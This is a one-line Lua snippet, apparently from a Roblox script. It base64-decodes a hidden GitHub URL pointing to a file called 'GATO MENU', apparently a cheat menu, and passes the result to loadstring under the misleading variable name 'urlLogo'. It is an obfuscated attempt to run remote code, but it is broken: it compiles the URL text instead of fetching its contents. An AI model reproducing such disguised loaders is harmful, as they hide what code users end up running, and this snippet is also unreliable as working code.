local urlLogo = loadstring(base64decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL05vcm1hbDk0L1JvYmxveC9yZWZzL2hlYWRzL21haW4vR0FUTyUyME1FTlU="))()
